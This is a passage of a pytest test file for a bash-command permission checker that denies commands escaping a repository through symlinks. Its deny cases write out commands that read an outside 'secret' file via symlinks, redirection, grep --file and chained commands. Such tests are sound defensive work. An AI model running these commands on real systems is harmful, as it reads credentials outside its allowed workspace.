        (repo / "notes.txt").write_text("notes")
        (repo / "creds").symlink_to(outside / "secret")
        (repo / "sub" / "rootlink").symlink_to(tmp_path)
        return repo

    @pytest.mark.parametrize(
        "cmd",
        [
            "cat creds",
            "cat < creds",
            "tail creds",
            "wc -l creds",
            "grep --file=creds pattern notes.txt",
            "head -c 100 sub/rootlink/outside/secret",
            "ls -la sub/rootlink",
            "cat notes.txt; cat creds",
            "cat notes.txt\ncat creds",
        ],
    )
    def test_symlink_pointing_outside_denied(self, root: Path, cmd: str) -> None:
        assert isinstance(check_bash_command(cmd, root), PermissionResultDeny)

    @pytest.mark.parametrize(
        "cmd",
        [
            "cat notes.txt",
            "cat does-not-exist.txt",
            "ls sub",
            "git log HEAD~5..HEAD -- notes.txt",
            "git diff main..feature",
            "grep -n 'foo$' notes.txt",
            "git log --format='%H' --since=2024-01-01 --author=a@b",
            "sort -k 2 notes.txt",
            "cat -",
            "ls --",
        ],
    )
    def test_ordinary_arguments_allowed(self, root: Path, cmd: str) -> None:
        assert isinstance(check_bash_command(cmd, root), PermissionResultAllow)

    def test_symlink_pointing_inside_allowed(self, root: Path) -> None:
        (root / "alias").symlink_to(root / "notes.txt")
        assert isinstance(check_bash_command("cat alias", root), PermissionResultAllow)

    def test_denial_names_the_symlink(self, root: Path) -> None:
        result = check_bash_command("cat creds", root)
        assert isinstance(result, PermissionResultDeny)
        assert "creds" in result.message
